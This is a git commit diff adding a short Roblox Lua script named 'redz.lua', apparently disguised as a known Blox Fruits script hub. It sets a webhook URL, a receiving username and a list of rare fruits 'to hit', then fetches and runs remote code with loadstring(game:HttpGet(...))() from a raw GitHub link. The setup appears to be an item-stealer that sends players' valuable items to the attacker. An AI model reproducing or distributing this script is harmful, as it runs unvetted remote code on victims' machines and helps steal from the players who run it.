8899b06c0e25bb65a3a85ad69e4749ca446b25b5
redz-main <donselling01@gmail.com>
2025-04-13 10:32:44 +0800

    Create redz.lua

--- redz.lua
+++ redz.lua
@@ -1,5 +1,5 @@
-Webhook = "" -- << Your Webhook
-Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=cVprdHd0cXRyTlEzT0V1MlpEUGRzUTpWSm1EWjM0bW0wa1ZjLTZDeTNHcFF5MUhGTnJNLUNVOWJmb1c4b3p0VURGNEtSdUMxaWMteXpoaHdVd200YkYtYWhIb0l2YnVvMFhGOWZ1NDVzMjNpWkphdmZMQXlJTWhnaDVVTG4wQjUxTUdnQnVyS3lQMnYyUHFpeEF1R0htdVlUejdQb3JiY2ltcWlmXzNTN3lhbGYxOEh3VjFXcDJYd05aR1pYRFlfeUk" -- << Your Webhook
+Usernames = {"zy10022001", ""} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
